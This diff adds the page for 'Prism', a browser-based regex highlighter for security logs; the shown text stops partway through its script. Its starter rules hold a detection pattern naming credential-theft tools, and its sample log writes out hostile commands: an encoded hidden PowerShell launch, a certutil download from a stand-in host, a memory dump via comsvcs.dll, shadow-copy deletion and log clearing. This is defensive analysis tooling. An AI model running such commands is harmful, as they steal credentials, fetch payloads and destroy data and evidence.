@@ -1,0 +1,1473 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Prism · Regex Highlighter</title>
+  <meta name="description" content="Paste long text and color it with your own regex rules. Hover any hit for its context. Runs in your browser.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23141a24'/%3E%3Cpath d='M5 21 L13 7 L21 21 Z' fill='none' stroke='%23e6ebf2' stroke-width='2' stroke-linejoin='round'/%3E%3Cpath d='M17 15 L28 11' stroke='%23ef5b5b' stroke-width='2'/%3E%3Cpath d='M17.5 16.5 L28 16' stroke='%23f2a93b' stroke-width='2'/%3E%3Cpath d='M18 18 L28 21' stroke='%233ecf8e' stroke-width='2'/%3E%3Cpath d='M18.5 19.5 L27 26' stroke='%234c8dff' stroke-width='2'/%3E%3C/svg%3E">
+  <style>
+:root {
+  --bg: #0e131b; --panel: #141a24; --panel-2: #1a2230; --raise: #212b3b;
+  --line: #2a3546; --line-2: #364357; --text: #e6ebf2; --muted: #8b97a8;
+  --accent: #4c8dff; --accent-ink: #fff; --danger: #ef5b5b; --ok: #3ecf8e; --warn: #f2a93b; --info: #a78bfa;
+  --row-hover: rgba(255, 255, 255, 0.03); --shadow: 0 6px 24px rgba(0, 0, 0, 0.35);
+  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+  --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --side: 360px; --gut: 3;
+}
+:root[data-theme="light"] {
+  --bg: #eef1f5; --panel: #fff; --panel-2: #f6f8fb; --raise: #eef2f7;
+  --line: #dbe1ea; --line-2: #c8d0dc; --text: #17202c; --muted: #5f6b7c; --accent: #2563eb;
+  --ok: #15803d; --warn: #b45309; --danger: #dc2626; --info: #7c3aed;
+  --row-hover: rgba(15, 30, 60, 0.03); --shadow: 0 6px 24px rgba(20, 30, 50, 0.12);
+}
+* { box-sizing: border-box; }
+html, body { height: 100%; margin: 0; }
+body { background: var(--bg); color: var(--text); font: 13px/1.45 var(--sans); display: flex; flex-direction: column; overflow: hidden; }
+button, input, select, textarea { font: inherit; color: inherit; }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.small { font-size: 11.5px; }
+.mono { font-family: var(--mono); font-size: 12px; }
+[hidden] { display: none !important; }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }
+kbd { font-family: var(--mono); font-size: 11px; border: 1px solid var(--line-2); border-bottom-width: 2px; border-radius: 4px; padding: 0 4px; background: var(--panel-2); }
+
+/* Top bar */
+#topbar { min-height: 48px; flex: none; display: flex; align-items: center; gap: 10px; padding: 6px 12px; background: var(--panel); border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+.brand { display: flex; align-items: center; gap: 8px; font-weight: 700; text-decoration: none; color: inherit; }
+.logo { width: 22px; height: 22px; flex: none; }
+.brand-name { font-size: 15px; }
+.suite-link { color: var(--muted); text-decoration: none; font-size: 12px; }
+.suite-link:hover { color: var(--text); }
+.actions { display: flex; align-items: center; gap: 6px; margin-left: auto; flex-wrap: wrap; }
+.btn { background: var(--raise); border: 1px solid var(--line); border-radius: 6px; padding: 5px 10px; cursor: pointer; white-space: nowrap; line-height: 1.3; text-decoration: none; display: inline-block; }
+.btn:hover { border-color: var(--line-2); background: var(--panel-2); }
+.btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }
+.btn:disabled { opacity: 0.45; cursor: default; }
+.btn.primary { background: var(--accent); border-color: var(--accent); color: var(--accent-ink); font-weight: 600; }
+.btn.danger { color: var(--danger); }
+.btn.small { padding: 2px 8px; font-size: 12px; }
+.btn.icon { width: 30px; padding: 5px 0; text-align: center; }
+.btn.icon.small { width: 24px; padding: 2px 0; }
+.menu { position: relative; }
+.menu-list { display: none; position: absolute; right: 0; top: calc(100% + 4px); z-index: 50; min-width: 250px; max-height: 70vh; overflow: auto; background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 4px; box-shadow: var(--shadow); }
+.menu.open .menu-list { display: block; }
+.menu-list button { display: block; width: 100%; text-align: left; background: none; border: 0; padding: 7px 10px; border-radius: 5px; cursor: pointer; }
+.menu-list button:hover { background: var(--raise); }
+.menu-list button.danger { color: var(--danger); }
+.menu-label { padding: 6px 10px 2px; font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
+.menu-sep { height: 1px; background: var(--line); margin: 4px 6px; }
+.menu-empty { padding: 6px 10px; color: var(--muted); font-size: 12px; }
+.set-row { display: flex; align-items: center; gap: 2px; }
+.set-row > button:first-child { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.set-row .set-meta { color: var(--muted); font-size: 11px; margin-left: 6px; }
+.set-row .set-del { width: auto !important; flex: none; color: var(--muted); padding: 4px 8px !important; }
+.set-row .set-del:hover { color: var(--danger); }
+
+/* Layout */
+#layout { flex: 1; display: grid; grid-template-columns: minmax(0, 1fr) 5px var(--side); min-height: 0; }
+#main { display: flex; flex-direction: column; min-width: 0; min-height: 0; }
+#layout.left { grid-template-columns: var(--side) 5px minmax(0, 1fr); }
+#layout.left #side { order: -2; }
+#layout.left #split { order: -1; }
+#split { cursor: col-resize; background: var(--line); }
+#split:hover, #split.drag { background: var(--accent); }
+#side { background: var(--panel); display: flex; flex-direction: column; min-height: 0; min-width: 0; }
+
+/* View toolbar */
+#toolbar { flex: none; display: flex; align-items: center; gap: 14px; padding: 6px 12px; border-bottom: 1px solid var(--line); background: var(--panel-2); flex-wrap: wrap; }
+#toolbar label { display: inline-flex; align-items: center; gap: 5px; cursor: pointer; color: var(--muted); }
+#toolbar label:hover { color: var(--text); }
+#toolbar select { background: var(--raise); border: 1px solid var(--line); border-radius: 5px; padding: 2px 6px; }
+.hitnav { margin-left: auto; display: flex; align-items: center; gap: 6px; }
+.hitnav .pos { font-family: var(--mono); font-size: 12px; color: var(--muted); min-width: 120px; text-align: center; }
+
+/* Viewer */
+#viewWrap { position: relative; flex: 1; min-height: 0; }
+#view { position: absolute; inset: 0; overflow: auto; font: 12.5px/18px var(--mono); tab-size: 4; outline: none; }
+#lines { width: max-content; min-width: 100%; padding-bottom: 30px; }
+#view.wrap #lines { width: auto; }
+.blk { display: block; }
+.ln { display: flex; min-height: 18px; }
+.ln:hover { background: var(--row-hover); }
+.no { flex: none; position: sticky; left: 0; z-index: 1; width: calc(var(--gut) * 1ch + 22px); padding-right: 10px; text-align: right; color: var(--muted); background: var(--panel); border-right: 1px solid var(--line); user-select: none; -webkit-user-select: none; }
+.tx { white-space: pre; padding: 0 14px 0 10px; }
+#view.wrap .tx { white-space: pre-wrap; word-break: break-all; flex: 1; min-width: 0; }
+.h { border-radius: 2px; cursor: pointer; }
+.h.multi { text-decoration: overline dotted; }
+.h.cur { outline: 1.5px solid var(--text); outline-offset: 1px; }
+.h.flash { animation: flash 1.1s ease-out; }
+@keyframes flash { 0%, 30% { outline: 3px solid var(--text); outline-offset: 2px; } 100% { outline: 1.5px solid var(--text); outline-offset: 1px; } }
+#editor { position: absolute; inset: 0; width: 100%; height: 100%; resize: none; border: 0; padding: 12px 14px; background: var(--bg); font: 12.5px/18px var(--mono); tab-size: 4; outline: none; white-space: pre; }
+#editBar { position: absolute; right: 18px; top: 10px; z-index: 3; display: flex; gap: 6px; align-items: center; background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 5px 6px 5px 10px; box-shadow: var(--shadow); }
+#empty { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; padding: 24px; }
+.empty-card { max-width: 520px; text-align: center; border: 2px dashed var(--line-2); border-radius: 14px; padding: 34px 30px; background: var(--panel); }
+.empty-card h2 { margin: 0 0 6px; font-size: 18px; }
+.empty-card p { margin: 0 0 16px; color: var(--muted); }
+.empty-card .btns { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; }
+body.dragging #viewWrap::after { content: "Drop to load"; position: absolute; inset: 8px; display: flex; align-items: center; justify-content: center; border: 2px dashed var(--accent); border-radius: 12px; background: rgba(76, 141, 255, 0.08); font-size: 16px; font-weight: 600; z-index: 5; pointer-events: none; }
+
+/* Status bar */
+#status { flex: none; display: flex; gap: 16px; padding: 4px 12px; border-top: 1px solid var(--line); background: var(--panel); color: var(--muted); font-size: 11.5px; white-space: nowrap; overflow: hidden; }
+#status .grow { flex: 1; }
+#status .busy { color: var(--warn); }
+
+/* Rules panel */
+.side-head { flex: none; display: flex; align-items: center; gap: 6px; padding: 8px 10px; border-bottom: 1px solid var(--line); }
+.side-head h2 { font-size: 13px; margin: 0 auto 0 2px; }
+.side-head h2 .muted { font-weight: 400; }
+.setname { flex: none; padding: 6px 12px; border-bottom: 1px solid var(--line); font-size: 11.5px; color: var(--muted); display: flex; gap: 6px; align-items: center; }
+.setname b { color: var(--text); font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.setname .dirty { color: var(--warn); }
+#rules { flex: 1; overflow: auto; padding: 8px; }
+.rule { background: var(--panel-2); border: 1px solid var(--line); border-radius: 8px; margin-bottom: 6px; }
+.rule.off .rule-row > :not(.on-box):not(.grip) { opacity: 0.45; }
+.rule.drop-before { box-shadow: 0 -2px 0 var(--accent); }
+.rule.drop-after { box-shadow: 0 2px 0 var(--accent); }
+.rule-row { display: flex; align-items: center; gap: 6px; padding: 5px 6px 5px 4px; }
+.grip { cursor: grab; color: var(--muted); padding: 0 2px; user-select: none; font-size: 12px; letter-spacing: -2px; }
+.on-box { margin: 0; cursor: pointer; }
+.swatch { position: relative; width: 16px; height: 16px; border-radius: 4px; background: var(--c); flex: none; cursor: pointer; box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25); }
+.swatch input { position: absolute; inset: 0; opacity: 0; width: 100%; height: 100%; cursor: pointer; border: 0; padding: 0; }
+.rule-name { flex: 1; min-width: 0; text-align: left; background: none; border: 0; padding: 2px 4px; cursor: pointer; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-weight: 600; border-radius: 4px; }
+.rule-name:hover { background: var(--raise); }
+.rule-name .caret { color: var(--muted); font-weight: 400; display: inline-block; width: 10px; }
+.badge { font-family: var(--mono); font-size: 11px; padding: 1px 7px; border-radius: 10px; background: var(--raise); border: 1px solid var(--line); color: var(--muted); cursor: pointer; min-width: 24px; text-align: center; }
+.badge.has { color: var(--text); }
+.badge.err { color: var(--danger); border-color: var(--danger); }
+.badge.pause { color: var(--warn); border-color: var(--warn); }
+.rule-body { display: none; padding: 4px 10px 10px; border-top: 1px solid var(--line); }
+.rule.open .rule-body { display: block; }
+.field { display: block; margin-top: 8px; }
+.field > span { display: block; font-size: 11px; color: var(--muted); margin-bottom: 3px; }
+.field input[type=text], .field textarea, .field select { width: 100%; background: var(--bg); border: 1px solid var(--line); border-radius: 6px; padding: 5px 7px; }
+.field textarea { resize: vertical; min-height: 34px; }
+.field input:focus, .field textarea:focus, .field select:focus { outline: none; border-color: var(--accent); }
+.field textarea.mono { font-size: 12px; }
+.err-msg { color: var(--danger); font-size: 11.5px; margin-top: 4px; }
+.flags { display: flex; flex-wrap: wrap; gap: 4px 12px; margin-top: 8px; }
+.flags label { display: inline-flex; gap: 4px; align-items: center; cursor: pointer; font-size: 12px; }
+.row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+.swatches { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 2px; }
+.swatches button { width: 18px; height: 18px; border-radius: 4px; border: 0; cursor: pointer; background: var(--c); box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25); padding: 0; }
+.swatches button.on { outline: 2px solid var(--text); outline-offset: 1px; }
+.rule-actions { display: flex; gap: 6px; margin-top: 10px; justify-content: flex-end; }
+.side-foot { flex: none; padding: 7px 12px; border-top: 1px solid var(--line); font-size: 11.5px; color: var(--muted); }
+
+/* Tooltip */
+#tip { position: fixed; z-index: 100; max-width: min(560px, calc(100vw - 16px)); background: var(--panel); border: 1px solid var(--line-2); border-radius: 8px; box-shadow: var(--shadow); padding: 8px 10px; pointer-events: none; font-size: 12.5px; }
+#tip.pinned { pointer-events: auto; border-color: var(--accent); }
+.tip-hit + .tip-hit { border-top: 1px solid var(--line); margin-top: 8px; padding-top: 8px; }
+.tip-head { display: flex; align-items: center; gap: 7px; }
+.tip-head b { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.chip { width: 10px; height: 10px; border-radius: 3px; flex: none; }
+.tip-desc { color: var(--muted); margin-top: 3px; white-space: pre-wrap; }
+.tip-val { margin-top: 6px; font-family: var(--mono); font-size: 12px; word-break: break-all; white-space: pre-wrap; max-height: 90px; overflow: auto; }
+.tip-groups { margin-top: 4px; font-family: var(--mono); font-size: 11.5px; display: grid; grid-template-columns: auto 1fr; gap: 1px 8px; }
+.tip-groups span:nth-child(odd) { color: var(--muted); }
+.tip-groups span:nth-child(even) { word-break: break-all; }
+.tip-ctx { margin-top: 6px; font-family: var(--mono); font-size: 11.5px; line-height: 16px; white-space: pre-wrap; word-break: break-all; background: var(--bg); border: 1px solid var(--line); border-radius: 6px; padding: 6px 8px; max-height: 190px; overflow: auto; color: var(--muted); }
+.tip-ctx .h { color: var(--text); }
+.tip-ctx .nl { opacity: 0.5; }
+.tip-act { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+.tip-close { background: none; border: 0; color: var(--muted); cursor: pointer; font-size: 15px; line-height: 1; padding: 0 2px; }
+.tip-more { margin-top: 6px; color: var(--muted); font-size: 11.5px; }
+.tip-hint { margin-top: 6px; color: var(--muted); font-size: 11px; }
+
+/* Toast */
+#toasts { position: fixed; bottom: 34px; left: 50%; transform: translateX(-50%); z-index: 200; display: flex; flex-direction: column; gap: 6px; align-items: center; }
+.toast { background: var(--panel); border: 1px solid var(--line-2); border-radius: 8px; padding: 7px 12px; box-shadow: var(--shadow); display: flex; gap: 10px; align-items: center; max-width: 80vw; }
+.toast button { background: none; border: 0; color: var(--accent); cursor: pointer; font-weight: 600; padding: 0; }
+
+@media (max-width: 760px) {
+  #layout { grid-template-columns: 1fr; grid-template-rows: 1fr 40vh; }
+  #split { display: none; }
+  #side { border-top: 1px solid var(--line); }
+}
+  </style>
+</head>
+<body>
+  <header id="topbar">
+    <a class="brand" href="/prism/" title="Prism">
+      <svg class="logo" viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#141a24"/><path d="M5 21 L13 7 L21 21 Z" fill="none" stroke="#e6ebf2" stroke-width="2" stroke-linejoin="round"/><path d="M17 15 L28 11" stroke="#ef5b5b" stroke-width="2"/><path d="M17.5 16.5 L28 16" stroke="#f2a93b" stroke-width="2"/><path d="M18 18 L28 21" stroke="#3ecf8e" stroke-width="2"/><path d="M18.5 19.5 L27 26" stroke="#4c8dff" stroke-width="2"/></svg>
+      <span class="brand-name">Prism</span>
+    </a>
+    <a class="suite-link" href="/tools/">jon.glass / Tools</a>
+    <div class="actions">
+      <div class="menu" id="dataMenu">
+        <button class="btn" type="button" data-menu>Text ▾</button>
+        <div class="menu-list">
+          <button type="button" data-act="open">Open file…</button>
+          <button type="button" data-act="edit">Edit text</button>
+          <button type="button" data-act="sample">Load sample log</button>
+          <div class="menu-sep"></div>
+          <button type="button" data-act="clear" class="danger">Clear text</button>
+        </div>
+      </div>
+      <div class="menu" id="exportMenu">
+        <button class="btn" type="button" data-menu>Export ▾</button>
+        <div class="menu-list">
+          <button type="button" data-act="csv">Hits (CSV)</button>
+          <button type="button" data-act="html">Highlighted text (HTML)</button>
+          <button type="button" data-act="rules-export">Rules (.prism.json)</button>
+          <div class="menu-label">Send to</div>
+          <button type="button" data-act="to-tessera" title="Unique matches of the rules marked as indicators">Indicators → Tessera</button>
+          <button type="button" data-act="to-recap" title="Every hit on a line with a timestamp, as a timeline event">Hits with times → Recap</button>
+          <button type="button" data-act="to-shifu" title="The hits table, to filter and group">Hits table → Shifu</button>
+        </div>
+      </div>
+      <button class="btn icon" type="button" id="sideBtn" title="Move the rules to the other side" aria-label="Move the rules to the other side"><svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="vertical-align:-2px"><rect x="1.5" y="2.5" width="13" height="11" rx="1.5" fill="none" stroke="currentColor" stroke-width="1.5"/><rect id="sideIcon" x="2.5" y="3.5" width="4" height="9" fill="currentColor"/></svg></button>
+      <button class="btn icon" type="button" id="themeBtn" title="Switch light and dark" aria-label="Switch light and dark"><svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" style="vertical-align:-2px"><circle cx="8" cy="8" r="6.5" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M8 1.5a6.5 6.5 0 0 1 0 13z" fill="currentColor"/></svg></button>
+    </div>
+  </header>
+
+  <div id="layout">
+    <section id="main">
+      <div id="toolbar">
+        <label title="Wrap long lines"><input type="checkbox" id="optWrap"> Wrap lines</label>
+        <label title="Hide lines with no hits"><input type="checkbox" id="optOnly"> Only lines with hits</label>
+        <label title="How much surrounding text the hover shows">Context
+          <select id="optCtx">
+            <option value="c40">±40 chars</option>
+            <option value="c100">±100 chars</option>
+            <option value="c250">±250 chars</option>
+            <option value="l0">Whole line</option>
+            <option value="l1">±1 line</option>
+            <option value="l3">±3 lines</option>
+            <option value="l8">±8 lines</option>
+          </select>
+        </label>
+        <div class="hitnav">
+          <button class="btn icon small" type="button" id="prevHit" title="Previous hit (Shift+N)">‹</button>
+          <span class="pos" id="hitPos">No hits</span>
+          <button class="btn icon small" type="button" id="nextHit" title="Next hit (N)">›</button>
+        </div>
+      </div>
+      <div id="viewWrap">
+        <div id="view" tabindex="0"><div id="lines"></div></div>
+        <textarea id="editor" spellcheck="false" hidden placeholder="Type or paste text here…"></textarea>
+        <div id="editBar" hidden><span class="muted small">Editing text</span><button class="btn small" type="button" id="editCancel">Cancel</button><button class="btn small primary" type="button" id="editDone">Done</button></div>
+        <div id="empty" hidden>
+          <div class="empty-card">
+            <h2>Paste your text</h2>
+            <p>Press <kbd id="pasteKey">Ctrl</kbd> + <kbd>V</kbd> anywhere, drop files here, or open one. Logs, alerts, command lines, JSON: anything long. Nothing leaves your browser.</p>
+            <div class="btns">
+              <button class="btn primary" type="button" data-act="open">Open file…</button>
+              <button class="btn" type="button" data-act="edit">Type or paste</button>
+              <button class="btn" type="button" data-act="sample">Load sample log</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="status"><span id="stText">No text</span><span id="stHits" class="grow"></span><span id="stTime"></span></div>
+    </section>
+
+    <div id="split" title="Drag to resize"></div>
+
+    <aside id="side">
+      <div class="side-head">
+        <h2>Rules <span class="muted" id="ruleCount"></span></h2>
+        <button class="btn small primary" type="button" id="addRule" title="Add a rule">+ Rule</button>
+        <button class="btn small" type="button" id="fromSel" title="Make a rule from the text you selected">From selection</button>
+        <div class="menu" id="setsMenu">
+          <button class="btn small" type="button" data-menu title="Save, load and share rule sets">Sets ▾</button>
+          <div class="menu-list" id="setsList"></div>
+        </div>
+      </div>
+      <div class="setname" id="setName"></div>
+      <div id="rules"></div>
+      <div class="side-foot">Top rule wins where hits overlap. Drag <span style="letter-spacing:-2px">⋮⋮</span> to reorder. Hover a hit for context, click it to pin.</div>
+    </aside>
+  </div>
+
+  <div id="tip" hidden></div>
+  <div id="toasts"></div>
+  <input type="file" id="fileIn" multiple hidden>
+  <input type="file" id="rulesIn" accept=".json,application/json" hidden>
+  <style id="ruleStyles"></style>
+
+<script src="/assets/suite/handoff.js"></script>
+<script>
+(() => {
+  'use strict';
+
+  // ---------- Basics ----------
+  const $ = (id) => document.getElementById(id);
+  const store = {
+    get(k, d) { try { const v = localStorage.getItem(k); return v === null ? d : JSON.parse(v); } catch (e) { return d; } },
+    set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); return true; } catch (e) { return false; } },
+    del(k) { try { localStorage.removeItem(k); } catch (e) { /* storage blocked */ } },
+  };
+  const esc = (s) => s.replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+  const fmtN = (n) => n.toLocaleString();
+  const fmtBytes = (n) => n < 1024 ? n + ' B' : n < 1048576 ? (n / 1024).toFixed(1) + ' KB' : (n / 1048576).toFixed(1) + ' MB';
+  const uid = () => 'r' + Math.random().toString(36).slice(2, 9);
+  const isMac = /Mac|iPhone|iPad/.test(navigator.platform || navigator.userAgent);
+
+  const BLOCK = 200;        // lines per lazily rendered block
+  const LH = 18;            // line height in px
+  const CAP = 200000;       // max hits per rule
+  const TIMEOUT = 6000;     // ms before a run is treated as runaway
+  const MAX_SAVED_TEXT = 3000000;
+
+  const PALETTE = ['#4c8dff', '#3ecf8e', '#f2a93b', '#ef5b5b', '#a78bfa', '#22d3ee', '#ec4899', '#facc15', '#fb923c', '#84cc16', '#14b8a6', '#94a3b8'];
+  const STYLES = { fill: 'Highlight', underline: 'Underline', box: 'Box', text: 'Colored text' };
+
+  const STARTER = [
+    { name: 'Suspicious tooling', pattern: String.raw`\b(?:mimikatz|sekurlsa|rubeus|bloodhound|sharphound|psexec(?:svc)?|procdump|certutil|bitsadmin|rundll32|regsvr32|mshta|wmic|vssadmin|wevtutil|ntdsutil|DownloadString|Invoke-Expression|IEX)\b|(?<![\w-])-(?:enc(?:odedcommand)?|ec|nop|noprofile|w(?:indowstyle)? hidden)\b`, flags: 'i', color: '#ef5b5b', style: 'fill', desc: 'Living-off-the-land binaries, credential tools and PowerShell tradecraft.', ioc: false },
+    { name: 'URL', pattern: String.raw`\b(?:https?|hxxps?|ftp)(?::|\[:\])//(?:\[\.\]|[^\s"'<>\[\]()])+`, flags: 'i', color: '#a78bfa', style: 'fill', desc: 'Web addresses, including hxxp and [:] defanged forms.' },
+    { name: 'IPv4', pattern: String.raw`\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.|\[\.\])){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b`, flags: '', color: '#4c8dff', style: 'fill', desc: 'IPv4 address, defanged [.] included.' },
+    { name: 'Email', pattern: String.raw`\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b`, flags: 'i', color: '#ec4899', style: 'fill', desc: '' },
+    { name: 'Domain', pattern: String.raw`\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.|\[\.\]))+(?:com|net|org|io|info|biz|xyz|top|ru|cn|co|uk|de|us|gov|edu|onion|cc|me|tk|site|online|club|example)\b`, flags: 'i', color: '#22d3ee', style: 'underline', desc: 'Domain names on common TLDs. Add your own TLDs to the list.' },
+    { name: 'SHA-256', pattern: String.raw`\b[a-f0-9]{64}\b`, flags: 'i', color: '#f2a93b', style: 'fill', desc: '' },
+    { name: 'SHA-1', pattern: String.raw`\b[a-f0-9]{40}\b`, flags: 'i', color: '#fb923c', style: 'fill', desc: '' },
+    { name: 'MD5', pattern: String.raw`\b[a-f0-9]{32}\b`, flags: 'i', color: '#facc15', style: 'fill', desc: '' },
+    { name: 'Windows path', pattern: String.raw`\b[a-z]:\\(?:[^\\\s"'<>|:*?]+\\)*[^\\\s"'<>|:*?]*|\\\\[^\\\s"']+\\[^\s"'<>|]+`, flags: 'i', color: '#3ecf8e', style: 'underline', desc: 'Drive and UNC paths.' },
+    { name: 'Registry key', pattern: String.raw`\b(?:HKLM|HKCU|HKU|HKCR|HKCC|HKEY_[A-Z_]+)(?::)?\\[^\s"'<>]+`, flags: 'i', color: '#14b8a6', style: 'underline', desc: '' },
+    { name: 'Timestamp', pattern: String.raw`\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:[.,]\d+)?(?:Z|[+-]\d{2}:?\d{2})?`, flags: '', color: '#94a3b8', style: 'text', desc: 'ISO 8601 style date and time.', ioc: false },
+    { name: 'Base64 blob', pattern: String.raw`(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{40,}={0,2}(?![A-Za-z0-9+/=])`, flags: '', color: '#84cc16', style: 'box', desc: 'Long Base64 runs. Often encoded commands or payloads.', on: false, ioc: false },
+  ];
+
+  const SAMPLE = [
+    '2026-11-20T14:02:11.483Z host=WS-FIN-07 user=CORP\\jsmith event=4624 logon_type=3 src=198.51.100.23',
+    '2026-11-20T14:02:15.120Z host=WS-FIN-07 proc=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe parent=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
+    '2026-11-20T14:02:15.121Z host=WS-FIN-07 cmd="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"',
+    '2026-11-20T14:02:16.902Z host=WS-FIN-07 dns_query=files-update.example answer=203.0.113.77',
+    '2026-11-20T14:02:17.330Z host=WS-FIN-07 http GET hxxp://files-update[.]example/dl/stage2.bin status=200 bytes=184320',
+    '2026-11-20T14:02:18.004Z host=WS-FIN-07 file_create=C:\\Users\\jsmith\\AppData\\Local\\Temp\\svch0st.exe',
+    '    md5=44d88612fea8a8f36de82e1278abb02f',
+    '    sha1=3395856ce81f2b7382dee72602f798b642f14140',
+    '    sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
+    '2026-11-20T14:02:19.551Z host=WS-FIN-07 reg_set=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater value="C:\\Users\\jsmith\\AppData\\Local\\Temp\\svch0st.exe"',
+    '2026-11-20T14:03:40.017Z host=WS-FIN-07 proc=C:\\Windows\\System32\\rundll32.exe cmd="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\ProgramData\\l.dmp full"',
+    '2026-11-20T14:05:02.774Z host=WS-FIN-07 net_conn dst=203.0.113.77:443 proto=tcp',
+    '2026-11-20T14:09:12.300Z host=DC-01 event=4769 user=jsmith@corp.example service=krbtgt ticket_enc=0x17',
+    '2026-11-20T14:11:45.090Z host=WS-FIN-07 proc=C:\\Windows\\System32\\certutil.exe cmd="certutil -urlcache -split -f https://paste.example/raw/k2Jd8 C:\\ProgramData\\p.txt"',
+    '2026-11-20T14:12:30.882Z host=FS-02 smb_open=\\\\FS-02\\Finance$\\Q4\\payroll_2026.xlsx user=CORP\\jsmith',
+    '2026-11-20T14:15:07.006Z host=WS-FIN-07 proc=C:\\Windows\\System32\\vssadmin.exe cmd="vssadmin delete shadows /all /quiet"',
+    '2026-11-20T14:15:09.411Z host=WS-FIN-07 proc=C:\\Windows\\System32\\wevtutil.exe cmd="wevtutil cl Security"',
+    '2026-11-20T14:16:00.000Z host=MAIL-01 smtp from=billing@invoices.example to=jsmith@corp.example subject="Overdue invoice 88213" attach=Invoice_88213.docm',
+    '{"ts":"2026-11-20T14:16:22Z","src_ip":"198.51.100.23","dst_ip":"192.0.2.10","url":"https://login.example/oauth2/authorize?client_id=8f14e45f","ua":"Mozilla/5.0"}',
+  ].join('\n');
+
+  // ---------- State ----------
+  const S = {
+    text: '', textVer: 0, starts: [0],
+    rules: [], ruleById: new Map(),
+    hits: [], ruleHits: new Map(), order: [],
+    segS: [], segE: [], segH: [],
+    viewLines: null, blocks: [],
+    curOff: -1, curHit: -1, curSeg: -1,
+    pinned: false, tipAnchor: null,
+    set: null, setDirty: false,
+    lastMs: 0, running: false,
+  };
+  const view = $('view'), linesEl = $('lines'), tip = $('tip');
+
+  // ---------- Text and lines ----------
+  function computeLines() {
+    const t = S.text, st = [0];
+    let i = -1;
+    while ((i = t.indexOf('\n', i + 1)) !== -1) st.push(i + 1);
+    if (st.length > 1 && st[st.length - 1] === t.length) st.pop();
+    S.starts = st;
+  }
+  const lineCount = () => S.text ? S.starts.length : 0;
+  function lineEnd(i) {
+    let e = i + 1 < S.starts.length ? S.starts[i + 1] - 1 : S.text.length;
+    if (e > S.starts[i] && S.text.charCodeAt(e - 1) === 13) e--;
+    return e;
+  }
+  function lineOf(off) {
+    const st = S.starts; let lo = 0, hi = st.length - 1;
+    while (lo < hi) { const m = (lo + hi + 1) >> 1; if (st[m] <= off) lo = m; else hi = m - 1; }
+    return lo;
+  }
+
+  function setText(t, opts = {}) {
+    S.text = t || '';
+    S.textVer++;
+    computeLines();
+    S.curOff = -1; S.curHit = -1; S.curSeg = -1;
+    hideTip(true);
+    if (S.text.length <= MAX_SAVED_TEXT) store.set('prism.text', S.text); else store.del('prism.text');
+    $('empty').hidden = !!S.text || !$('editor').hidden;
+    applyResults([], 0, true);
+    computeViewLines(); rebuildView(null);
+    view.scrollTop = 0; view.scrollLeft = 0;
+    runMatch(0);
+    if (!opts.quiet && S.text.length > MAX_SAVED_TEXT) toast('This text is too big to keep between visits. Rules are still saved.');
+  }
+
+  function replaceText(t, label) {
+    const prev = S.text;
+    setText(t);
+    if (prev && prev !== t) toast(label + ' (replaced the previous text)', { label: 'Undo', fn: () => setText(prev) });
+    else if (label) toast(label);
+  }
+
+  // ---------- Rules ----------
+  function normRule(r) {
+    const flags = String(r.flags || '').replace(/[^imsu]/g, '');
+    return {
+      id: uid(),
+      name: String(r.name || 'Rule').slice(0, 120),
+      pattern: String(r.pattern || ''),
+      flags: Array.from(new Set(flags.split(''))).join(''),
+      color: /^#[0-9a-f]{6}$/i.test(r.color) ? r.color.toLowerCase() : PALETTE[0],
+      style: STYLES[r.style] ? r.style : 'fill',
+      desc: String(r.desc || r.description || ''),
+      on: r.on !== false, ioc: r.ioc !== false,
